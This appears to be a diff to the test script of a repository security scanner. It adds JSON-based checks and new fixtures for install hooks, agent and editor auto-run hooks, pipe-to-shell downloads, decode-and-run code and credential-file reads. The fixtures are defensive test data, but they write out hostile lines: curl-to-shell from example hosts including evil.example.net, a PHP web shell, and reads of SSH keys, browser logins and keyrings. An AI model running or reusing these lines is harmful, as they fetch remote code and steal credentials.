@@ -17,9 +17,24 @@ for c in curl wget npm npx node yarn pnpm make pre-commit direnv pip pip3 cargo 
 done
 export PATH="$T/bin:$PATH"
 pass=0 fail=0 out='' rc=0
-check() { if eval "$2"; then pass=$((pass+1)); echo "ok   $1"; else fail=$((fail+1)); echo "FAIL $1"; echo "     exit $rc, output was:"; printf '%s\n' "$out" | head -50 | sed 's/^/     /'; fi; }
+check() { if eval "$2"; then pass=$((pass+1)); echo "ok   $1"; else fail=$((fail+1)); echo "FAIL $1"; echo "     exit $rc, output was:"; printf '%s\n' "$out" | head -60 | sed 's/^/     /'; fi; }
 scan() { out=$("$TOOL" "$@" 2>&1); rc=$?; }
+scanj() { out=$("$TOOL" --json --max 0 "$@" 2>&1); rc=$?; }
 has() { printf '%s\n' "$out" | grep -qF -- "$1"; }
+# jhas high|medium RULE FILE [LINE]: the JSON output from scanj has that finding
+jhas() { printf '%s' "$out" | python3 -I -c '
+import json, sys
+d = json.load(sys.stdin)
+sev, rule, f = sys.argv[1:4]
+line = sys.argv[4] if len(sys.argv) > 4 else None
+sys.exit(0 if any(x["rule"] == rule and x["file"] == f and (line is None or str(x["line"]) == line) for x in d[sev]) else 1)' "$@"; }
+# jnone FILE: no HIGH or MEDIUM finding names FILE
+jnone() { printf '%s' "$out" | python3 -I -c '
+import json, sys
+d = json.load(sys.stdin)
+sys.exit(1 if any(x["file"] == sys.argv[1] for s in ("high", "medium") for x in d[s]) else 0)' "$1"; }
+# jcount high|medium N: the JSON output has N findings of that severity
+jcount() { printf '%s' "$out" | python3 -I -c 'import json, sys; sys.exit(json.load(sys.stdin)["counts"][sys.argv[1]] != int(sys.argv[2]))' "$1" "$2"; }
 mk() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
 bytes() { python3 -I -c "import sys; open(sys.argv[1], 'wb').write(eval(sys.argv[2]))" "$@"; }
 evil() { printf '#!/bin/sh\necho "ran %s" >> "%s"\n' "$1" "$CANARY"; }
@@ -95,15 +110,14 @@ printf 'fn main() {}\n' > "$R/native/build.rs"
 printf '[package]\nname = "m"\n[lib]\nproc-macro = true\n' > "$R/native/Cargo.toml"
 printf 'require "mkmf"\ncreate_makefile("x")\n' > "$R/native/extconf.rb"
 printf '{"scripts": {"post-install-cmd": "php evil.php"}}\n' > "$R/composer.json"
-scan "$R"
+scanj "$R"
 check "install hooks exit 1" '[ $rc -eq 1 ]'
-check "npm postinstall is HIGH with its line" 'has "package.json:4" && has "\"postinstall\": \"node scripts/setup.js\""'
-check "npm prepare is HIGH too" 'has "the \"prepare\" script"'
-check "setup.py cmdclass is HIGH" 'has "setup.py:6" && has "custom setup command"'
-check "an in-tree build backend is HIGH" 'has "pyproject.toml:4"'
-check "a .pth import line is HIGH" 'has "pkg/evil.pth:1"'
-check "binding.gyp, build.rs, a proc-macro and extconf.rb are HIGH" 'has "native/binding.gyp" && has "native/build.rs" && has "native/Cargo.toml:4" && has "native/extconf.rb"'
-check "a Composer install script is HIGH" 'has "composer.json:1"'
+check "npm postinstall and prepare are HIGH, each with its line" 'jhas high install-hook package.json 4 && jhas high install-hook package.json 5'
+check "setup.py cmdclass is HIGH" 'jhas high install-hook setup.py 6'
+check "an in-tree build backend is HIGH" 'jhas high install-hook pyproject.toml 4'
+check "a .pth import line is HIGH" 'jhas high install-hook pkg/evil.pth 1'
+check "binding.gyp, build.rs, a proc-macro and extconf.rb are HIGH" 'jhas high install-hook native/binding.gyp && jhas high install-hook native/build.rs && jhas high install-hook native/Cargo.toml 4 && jhas high install-hook native/extconf.rb'
+check "a Composer install script is HIGH" 'jhas high install-hook composer.json 1'
 
 # --- editor, agent and dev-environment hooks ----------------------------------
 R=$T/autorun; mkdir -p "$R"
@@ -111,18 +125,16 @@ mk "$R/.vscode/tasks.json" <<'EOF'
 {"version": "2.0.0", "tasks": [{"label": "x", "command": "./x.sh",
   "runOptions": {"runOn": "folderOpen"}}]}
 EOF
-printf '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "./x.sh"}]}]}}\n' > "$T/claude-settings.json"
-mkdir -p "$R/.claude" && cp "$T/claude-settings.json" "$R/.claude/settings.json"
+mkdir -p "$R/.claude" && printf '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "./x.sh"}]}]}}\n' > "$R/.claude/settings.json"
 printf '{"mcpServers": {"x": {"command": "node", "args": ["server.js"]}}}\n' > "$R/.mcp.json"
-printf '{\n  "initializeCommand": "./x.sh",\n  "postCreateCommand": "./y.sh"\n}\n' > "$T/dc.json"
-mkdir -p "$R/.devcontainer" && cp "$T/dc.json" "$R/.devcontainer/devcontainer.json"
+mkdir -p "$R/.devcontainer" && printf '{\n  "initializeCommand": "./x.sh",\n  "postCreateCommand": "./y.sh"\n}\n' > "$R/.devcontainer/devcontainer.json"
 evil envrc > "$R/.envrc"
-scan "$R"
-check "VS Code folderOpen task is HIGH" 'has ".vscode/tasks.json:2" && has "when you open the folder"'
-check "Claude Code project hooks are HIGH" 'has ".claude/settings.json:1" && has "Claude Code runs these commands"'
-check "a project MCP server is HIGH" 'has ".mcp.json:1"'
-check "devcontainer initializeCommand is HIGH, postCreateCommand MEDIUM" 'has ".devcontainer/devcontainer.json:2" && has ".devcontainer/devcontainer.json:3" && has "runs inside the dev container"'
-check ".envrc is MEDIUM" 'has ".envrc  direnv runs this file"'
+scanj "$R"
+check "a VS Code folderOpen task is HIGH" 'jhas high auto-run .vscode/tasks.json 2'
+check "Claude Code project hooks are HIGH" 'jhas high auto-run .claude/settings.json 1'
+check "a project MCP server is HIGH" 'jhas high auto-run .mcp.json 1'
+check "devcontainer initializeCommand is HIGH, postCreateCommand MEDIUM" 'jhas high auto-run .devcontainer/devcontainer.json 2 && jhas medium dev-env .devcontainer/devcontainer.json 3'
+check ".envrc is MEDIUM" 'jhas medium dev-env .envrc'
 
 # --- setup commands the README tells you to run -------------------------------
 R=$T/readme; mkdir -p "$R"
@@ -144,12 +156,11 @@ evil install.sh > "$R/install.sh"; chmod +x "$R/install.sh"
 printf '<html></html>\n' > "$R/index.html"
 printf '{"scripts": {"bootstrap": "node scripts/bootstrap.js"}}\n' > "$R/package.json"
 printf 'repos: []\n' > "$R/.pre-commit-config.yaml"
+scanj "$R"
+check "the README's ./install.sh, make target, npm script and pre-commit install are HIGH" 'jhas high readme-run README.md 6 && jhas high readme-run README.md 7 && jhas high readme-run README.md 8 && jhas high readme-run README.md 9'
+check "prose and a file name in a code span are not commands" '! jhas high readme-run README.md 3 && ! jhas high readme-run README.md 12'
 scan "$R"
-check "the README's ./install.sh is HIGH" 'has "README.md:6" && has "the README runs ./install.sh"'
-check "the README's make target is HIGH" 'has "README.md:7" && has "the README runs make setup"'
-check "the README's npm script is HIGH, with its body" 'has "README.md:8" && has "node scripts/bootstrap.js"'
-check "the README's pre-commit install is HIGH" 'has "README.md:9" && has "installs the git hooks in .pre-commit-config.yaml"'
-check "prose and a file name in a code span are not commands" '! has "README.md:3" && ! has "README.md:12"'
+check "README notes name what runs" 'has "the README runs ./install.sh" && has "the README runs make setup" && has "node scripts/bootstrap.js" && has "installs the git hooks in .pre-commit-config.yaml"'
 
 # --- pipe-to-shell --------------------------------------------------------------
 R=$T/pipe; mkdir -p "$R/scripts" "$R/.github/workflows"
@@ -166,14 +177,14 @@ printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/c.sh \\\n  | bash\n' > "$R/
 python3 -I -c "import sys; open(sys.argv[1], 'w', encoding='utf-16').write('iex (iwr https://dl.example.org/d.ps1)\n')" "$R/scripts/d.ps1"
 printf 'on: push\njobs:\n  x:\n    steps:\n      - run: curl -fsSL https://dl.example.org/ci.sh | sh\n' > "$R/.github/workflows/ci.yml"
 printf '#!/bin/sh\ncommand -v curl >/dev/null || exit 1\ncurl -fsSL https://dl.example.org/x.sh -o x.sh || exit 1\n' > "$R/scripts/ok.sh"
-scan "$R"
-check "curl | sh in a README code block is HIGH" 'has "README.md:4"'
-check "wget -qO- | sudo bash is HIGH" 'has "scripts/a.sh:2"'
-check "bash <(curl ...) is HIGH" 'has "scripts/b.sh:2"'
-check "a pipe after a line continuation is HIGH" 'has "scripts/c.sh:2"'
-check "iex (iwr ...) in a UTF-16 PowerShell file is HIGH" 'has "scripts/d.ps1:1"'
-check "pipe-to-shell in CI is MEDIUM, not HIGH" 'has "HIGH 5: pipe-to-shell 5" && has "CI only"'
-check "command -v curl is not a download, curl -o is" '! has "scripts/ok.sh:2" && has "scripts/ok.sh:3"'
+scanj "$R"
+check "curl | sh in a README code block is HIGH" 'jhas high pipe-to-shell README.md 4'
+check "wget -qO- | sudo bash is HIGH" 'jhas high pipe-to-shell scripts/a.sh 2'
+check "bash <(curl ...) is HIGH" 'jhas high pipe-to-shell scripts/b.sh 2'
+check "a pipe after a line continuation is HIGH" 'jhas high pipe-to-shell scripts/c.sh 2'
+check "iex (iwr ...) in a UTF-16 PowerShell file is HIGH, and only once" 'jhas high pipe-to-shell scripts/d.ps1 1 && ! jhas high decode-and-run scripts/d.ps1 1'
+check "pipe-to-shell in CI is MEDIUM, not HIGH" 'jhas medium pipe-to-shell .github/workflows/ci.yml 5 && ! jhas high pipe-to-shell .github/workflows/ci.yml 5 && jcount high 5'
+check "command -v curl is not a download, curl -o is" '! jhas medium download scripts/ok.sh 2 && jhas medium download scripts/ok.sh 3'
 
 # --- decode-and-run ---------------------------------------------------------------
 R=$T/decode; mkdir -p "$R"
@@ -182,12 +193,12 @@ printf 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n' > "$R/b.py"
 printf 'eval(atob("YWxlcnQoMSk="));\n' > "$R/c.js"
 printf '#!/bin/sh\neval "$(curl -fsSL https://env.example.org/e)"\n' > "$R/d.sh"
 printf 'powershell -NoProfile -enc SQBFAFgAIAAoAGkAdwByACkA\n' > "$R/e.cmd"
-scan "$R"
-check "base64 -d | sh is HIGH" 'has "a.sh:2"'
-check "exec(base64.b64decode(...)) is HIGH" 'has "b.py:2"'
-check "eval(atob(...)) is HIGH" 'has "c.js:1"'
-check "eval \"\$(curl ...)\" is HIGH" 'has "d.sh:2"'
-check "powershell -enc is HIGH" 'has "e.cmd:1"'
+scanj "$R"
+check "base64 -d | sh is HIGH" 'jhas high decode-and-run a.sh 2'
+check "exec(base64.b64decode(...)) is HIGH" 'jhas high decode-and-run b.py 2'
+check "eval(atob(...)) is HIGH" 'jhas high decode-and-run c.js 1'
+check "eval \"\$(curl ...)\" is HIGH" 'jhas high decode-and-run d.sh 2'
+check "powershell -enc is HIGH" 'jhas high decode-and-run e.cmd 1'
 
 # --- committed binaries, blobs, archives ------------------------------------------
 R=$T/bin; mkdir -p "$R"/{elf,pe,macho,so,jar,pyc,disguised,blob,small,arc}
@@ -203,14 +214,14 @@ bytes "$R/small/x.dat" "b'\0' + __import__('os').urandom(2048)"
 bytes "$R/arc/fixtures.zip" "b'PK\x03\x04' + bytes(500)"
 python3 -I -c "import base64, os, sys; open(sys.argv[1], 'w').write('const p = \"' + base64.b64encode(os.urandom(40000)).decode() + '\";\n')" "$R/payload.js"
 python3 -I -c "import base64, sys; open(sys.argv[1], 'w').write('.a { background: url(data:image/png;base64,' + base64.b64encode(b'\x89PNG' + bytes(40000)).decode() + '); }\n')" "$R/style.css"
-scan "$R"
-check "ELF, PE, Mach-O, .so, .jar and .pyc binaries are HIGH" 'has "elf/tool" && has "pe/tool.exe" && has "macho/tool" && has "so/libx.so.1" && has "jar/app.jar" && has "pyc/m.pyc"'
-check "an ELF named .png is still a binary" 'has "disguised/logo.png"'
-check "a 600 KB unknown binary is a HIGH blob" 'has "blob/payload.dat"'
-check "a 2 KB unknown binary is only counted" '! has "small/x.dat" && has "1 small binary file of unknown format"'
-check "a 40 KB base64 string in code is a HIGH blob" 'has "payload.js:1"'
-check "a data: URI image is not a blob" '! has "style.css"'
-check "a small archive is MEDIUM" 'has "arc/fixtures.zip"'
+scanj "$R"
+check "ELF, PE, Mach-O, .so, .jar and .pyc binaries are HIGH" 'jhas high binary elf/tool && jhas high binary pe/tool.exe && jhas high binary macho/tool && jhas high binary so/libx.so.1 && jhas high binary jar/app.jar && jhas high binary pyc/m.pyc'
+check "an ELF named .png is still a binary" 'jhas high binary disguised/logo.png'
+check "a 600 KB unknown binary is a HIGH blob" 'jhas high blob blob/payload.dat'
+check "a 2 KB unknown binary is only counted" 'jnone small/x.dat && has "1 small binary file of unknown format"'
+check "a 40 KB base64 string in code is a HIGH blob" 'jhas high blob payload.js 1'
+check "a data: URI image is not a blob" 'jnone style.css'
+check "a small archive is MEDIUM" 'jhas medium archive arc/fixtures.zip'
 
 # --- credential stores --------------------------------------------------------------
 R=$T/cred; mkdir -p "$R"
@@ -220,17 +231,18 @@ printf '#!/bin/sh\nsecurity find-generic-password -s x -w\n' > "$R/c.sh"
 printf "db = Path.home() / 'Library/Application Support/Google/Chrome/Default/Login Data'\n" > "$R/d.py"
 printf '# this script never reads ~/.ssh/id_rsa\nprint(1)\n' > "$R/e.py"
 printf 'Copy your key to `~/.ssh/id_rsa` first.\n' > "$R/NOTES.md"
-scan "$R"
-check "reads of ~/.ssh, ~/.aws, the keychain and a browser profile are HIGH" 'has "a.js:1" && has "b.py:1" && has "c.sh:2" && has "d.py:1"'
-check "a comment or a doc that names ~/.ssh is not a read" '! has "e.py" && ! has "NOTES.md"'
+scanj "$R"
+check "reads of ~/.ssh, ~/.aws, the keychain and a browser profile are HIGH" 'jhas high credential-read a.js 1 && jhas high credential-read b.py 1 && jhas high credential-read c.sh 2 && jhas high credential-read d.py 1'
+check "a comment or a doc that names ~/.ssh is not a read" 'jnone e.py && jnone NOTES.md'
 
 # --- hidden code ---------------------------------------------------------------------
 R=$T/hidden; mkdir -p "$R"
 printf 'const isAdmin = false; /* \xe2\x80\xae } if (isAdmin) { \xe2\x81\xa6 */\n' > "$R/a.js"
 python3 -I -c "import sys; open(sys.argv[1], 'w').write('x = 1' + ' ' * 200 + 'import os; os.system(\"id\")\n')" "$R/b.py"
+scanj "$R"
+check "a bidi control character in code is HIGH" 'jhas high hidden-code a.js 1'
+check "code pushed off screen by spaces is HIGH" 'jhas high hidden-code b.py 1'
 scan "$R"
-check "a bidi control character in code is HIGH" 'has "a.js:1"'
-check "code pushed off screen by spaces is HIGH" 'has "b.py:1"'
 check "the bidi character is escaped in the output" 'has "\\u202e"'
 
 # --- MEDIUM: telemetry, endpoints, downloads, minified ---------------------------------
@@ -241,13 +253,14 @@ printf 'const API = "https://api.acme-tracker.io/v1";\nconst HOOK = "https://dis
 printf 'import urllib.request\nurllib.request.urlretrieve(URL, "m.bin")\n' > "$R/src/d.py"
 python3 -I -c "import sys; open(sys.argv[1], 'w').write('!function(e,t){e.x=t(e)}(this,function(n){var r=[],o=n.document;return r});' * 40 + '\n')" "$R/src/helper.js"
 cp "$R/src/helper.js" "$R/dist/app.js"; printf 'var x=1;\n' > "$R/src/lib.min.js"
+scanj "$R"
+check "telemetry, a download and minified code outside dist are MEDIUM" 'jhas medium telemetry src/a.js 1 && jhas medium telemetry src/b.py 1 && jhas medium download src/d.py 2 && jhas medium minified src/helper.js 1 && jhas medium minified src/lib.min.js'
+check "minified code inside dist is not reported" 'jnone dist/app.js'
+check "MEDIUM findings alone exit 0" '[ $rc -eq 0 ]'
 scan "$R"
-check "telemetry is MEDIUM, one finding per vendor" 'has "posthog  src/a.js:1" && has "sentry  src/b.py:1"'
+check "telemetry is one finding per vendor" 'has "posthog  src/a.js:1" && has "sentry  src/b.py:1"'
 check "a hard-coded host is MEDIUM" 'has "api.acme-tracker.io  src/c.js:1"'
 check "a webhook host and a raw IP get their own notes" 'has "discord.com  src/c.js:2  paste, webhook" && has "1.2.3.4  src/c.js:3  raw IP address"'
-check "urlretrieve is a MEDIUM download" 'has "src/d.py:2"'
-check "minified code outside dist is MEDIUM, inside dist it is not" 'has "src/helper.js:1" && has "src/lib.min.js" && ! has "dist/app.js"'
-check "MEDIUM findings alone exit 0" '[ $rc -eq 0 ]'
 
 # --- licenses ---------------------------------------------------------------------------
 R=$T/lic; mkdir -p "$R/a" "$R/b"
@@ -261,11 +274,11 @@ printf '#!/bin/sh\ncurl -fsSL https://evil.example.net/x | sh\n' > "$T/outside/s
 bytes "$T/outside/tool" "b'\x7fELF\x02\x01\x01' + bytes(200)"
 ln -s "$T/outside/secret.sh" "$R/link.sh"; ln -s "$T/outside" "$R/linkdir"; ln -s "$HOME/.ssh/id_rsa" "$R/key"
 ln -s README.md "$R/inside"; printf 'hi\n' > "$R/README.md"
-scan "$R"
-check "a symlink out of DIR is not followed" '! has "pipe-to-shell" && ! has "binary"'
-check "symlinks out of DIR are MEDIUM" 'has "link.sh  symlink" && has "linkdir  symlink"'
-check "a symlink into ~/.ssh is HIGH" 'has "credential-read" && has "key  symlink into a credential store"'
-check "a symlink inside DIR is not reported" '! has "inside  symlink"'
+scanj "$R"
+check "a symlink out of DIR is not followed" '! has "pipe-to-shell" && ! has "\"binary\""'
+check "symlinks out of DIR are MEDIUM" 'jhas medium symlink-out link.sh && jhas medium symlink-out linkdir'
+check "a symlink into ~/.ssh is HIGH" 'jhas high credential-read key'
+check "a symlink inside DIR is not reported" 'jnone inside'
 
 # --- git: config and hooks never run, history still read ---------------------------------
 R=$T/gitrepo; mkdir -p "$R"
@@ -275,8 +288,8 @@ printf '[core]\n\tfsmonitor = %s\n\tpager = %s\n[log]\n\tshowSignature = true\n[
   "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" >> "$R/.git/config"
 evil post-checkout > "$R/.git/hooks/post-checkout"; chmod +x "$R/.git/hooks/post-checkout"
 evil git-in-dir > "$R/git"; chmod +x "$R/git"
-out=$(cd "$R" && PATH="$R:.:$PATH" "$TOOL" . 2>&1); rc=$?
-check "git config commands and hooks in .git are HIGH" 'has ".git/config:" && has ".git/hooks/post-checkout"'
+out=$(cd "$R" && PATH="$R:.:$PATH" "$TOOL" --json --max 0 . 2>&1); rc=$?
+check "git config commands and hooks in .git are HIGH" 'jhas high auto-run .git/config && jhas high auto-run .git/hooks/post-checkout'
 check "git history is still read" 'has "1 commit since" && has "1 author"'
 check "nothing in .git ran, and a git inside DIR was not used" '[ ! -e "$CANARY" ]'
 git -C "$R" status >/dev/null 2>&1
@@ -292,8 +305,61 @@ printf '{"scripts": {"postinstall": "node x.js"}}\n' > "$R/node_modules/evil/pac
 bytes "$R/vendor/x/lib.so" "b'\x7fELF\x02\x01\x01' + bytes(200)"
 scan "$R"
 check "node_modules and vendor are skipped by default and listed" '[ $rc -eq 0 ] && has "skipped node_modules, vendor"'
-scan --all "$R"
-check "--all scans them" '[ $rc -eq 1 ] && has "node_modules/evil/package.json:1" && has "vendor/x/lib.so"'
+scanj --all "$R"
+check "--all scans them" '[ $rc -eq 1 ] && jhas high install-hook node_modules/evil/package.json 1 && jhas high binary vendor/x/lib.so'
+
+# --- more ways to run downloaded or decoded code -------------------------------------
+R=$T/more; mkdir -p "$R/p" "$R/d" "$R/c"
+printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/a.sh | /bin/bash\n' > "$R/p/abs.sh"
+printf '#!/bin/sh\nwget -qO- https://dl.example.org/b | /usr/bin/env bash\n' > "$R/p/env.sh"
+printf '#!/bin/sh\npython3 -c "$(curl -fsSL https://dl.example.org/c.py)"\n' > "$R/p/py.sh"
+printf '#!/bin/sh\ncurl -fsSLo i.sh https://dl.example.org/i.sh && sh i.sh\n' > "$R/p/dl.sh"
+printf '#!/bin/sh\nwget https://dl.example.org/tool && chmod +x tool && ./tool\n' > "$R/p/chmod.sh"
+printf '& ([scriptblock]::Create((irm https://dl.example.org/s.ps1)))\n' > "$R/p/sb.ps1"
+printf '<?php system(base64_decode($_GET["c"])); ?>\n' > "$R/d/a.php"
+printf 'import base64, pickle\nobj = pickle.loads(base64.b64decode(BLOB))\n' > "$R/d/b.py"
+printf "eval(function(p,a,c,k,e,d){e=String;return p}('0',1,1,'x'.split('|'),0,{}));\n" > "$R/d/c.js"
+printf 'eval pack("H*", "414141");\n' > "$R/d/d.pl"
+printf '#!/bin/sh\nprintf %s | sh\n' "'\\x65\\x63\\x68\\x6f\\x20\\x68\\x69'" > "$R/d/e.sh"
+printf '#!/bin/bash\nbash <<< "$(echo ZWNobyBoaQo= | base64 -d)"\n' > "$R/d/f.sh"
+printf 'exec("".join(map(chr, [112, 114, 105, 110, 116])))\n' > "$R/d/g.py"
+printf "const t = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n" > "$R/c/a.js"
+printf 'h = open(os.path.expanduser("~/.bash_history")).read()\n' > "$R/c/b.py"
+printf "const db = process.env.APPDATA + '\\\\discord\\\\Local Storage\\\\leveldb';\n" > "$R/c/c.js"
+printf "k = os.path.expanduser('~/.local/share/keyrings/login.keyring')\n" > "$R/c/d.py"
+scanj "$R"
+check "a pipe into /bin/bash or /usr/bin/env bash is HIGH" 'jhas high pipe-to-shell p/abs.sh 2 && jhas high pipe-to-shell p/env.sh 2'
+check "python3 -c \"\$(curl ...)\" is HIGH" 'jhas high pipe-to-shell p/py.sh 2'
+check "download, then run on the same line, is HIGH" 'jhas high pipe-to-shell p/dl.sh 2 && jhas high pipe-to-shell p/chmod.sh 2'
+check "a PowerShell scriptblock from irm is HIGH" 'jhas high pipe-to-shell p/sb.ps1 1'
+check "system(base64_decode(...)) and pickle.loads(b64decode(...)) are HIGH" 'jhas high decode-and-run d/a.php 1 && jhas high decode-and-run d/b.py 2'
+check "packed JavaScript and Perl eval pack are HIGH" 'jhas high decode-and-run d/c.js 1 && jhas high decode-and-run d/d.pl 1'
+check "escaped bytes piped to sh and a base64 here-string are HIGH" 'jhas high decode-and-run d/e.sh 2 && jhas high decode-and-run d/f.sh 2'
+check "exec of a chr() string is HIGH" 'jhas high decode-and-run d/g.py 1'
+check "reads of ~/.npmrc, shell history, Discord storage and keyrings are HIGH" 'jhas high credential-read c/a.js 1 && jhas high credential-read c/b.py 1 && jhas high credential-read c/c.js 1 && jhas high credential-read c/d.py 1'
+
+R=$T/morehooks; mkdir -p "$R/plugin/hooks" "$R/plugin/.claude-plugin" "$R/sx"
+printf 'import os\n' > "$R/sitecustomize.py"
+printf 'source "https://rubygems.org"\nsystem("curl -s https://x.example.com | sh")\ngem "rake"\n' > "$R/Gemfile"
+printf 'Gem::Specification.new do |s|\n  s.files = `git ls-files -z`.split("\\x0")\nend\n' > "$R/ok.gemspec"
+printf '<project><build><plugins><plugin>\n<artifactId>exec-maven-plugin</artifactId>\n</plugin></plugins></build></project>\n' > "$R/pom.xml"
+printf '{ pkgs }: pkgs.mkShell {\n  shellHook = "./setup.sh";\n}\n' > "$R/shell.nix"
+printf '{"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "./h.sh"}]}]}}\n' > "$R/plugin/hooks/hooks.json"
+printf '{"name": "p", "mcpServers": {"x": {"command": "node"}}}\n' > "$R/plugin/.claude-plugin/plugin.json"
+bytes "$R/sx/install.run" "b'#!/bin/sh\ntail -n +3 \"\$0\" | tar xz; ./payload\n' + bytes(64) + __import__('os').urandom(256)"
+scanj "$R"
+check "sitecustomize.py is HIGH" 'jhas high install-hook sitecustomize.py'
+check "a Gemfile that shells out is HIGH; a gemspec that runs git ls-files is not" 'jhas high install-hook Gemfile 2 && jnone ok.gemspec'
+check "a Maven exec plugin is HIGH" 'jhas high install-hook pom.xml 2'
+check "a Nix shellHook is MEDIUM" 'jhas medium dev-env shell.nix 2'
+check "Claude Code plugin hooks and MCP servers are HIGH" 'jhas high auto-run plugin/hooks/hooks.json 1 && jhas high auto-run plugin/.claude-plugin/plugin.json 1'
+check "a script with binary data after it is HIGH" 'jhas high binary sx/install.run'
+
+R=$T/robust; mkdir -p "$R"
+printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh\n' > "$R/$(printf 'bad\377.sh')"
+python3 -I -c "import sys; open(sys.argv[1], 'w').write('[' * 100000 + ']' * 100000)" "$R/package.json"
+scanj "$R"
+check "an undecodable file name and deeply nested JSON do not crash the scan" '[ $rc -eq 1 ] && jhas high pipe-to-shell "bad\\udcff.sh" 2'
 
 # --- output safety, special files, flags, exit codes ----------------------------------------
 R=$T/out; mkdir -p "$R"
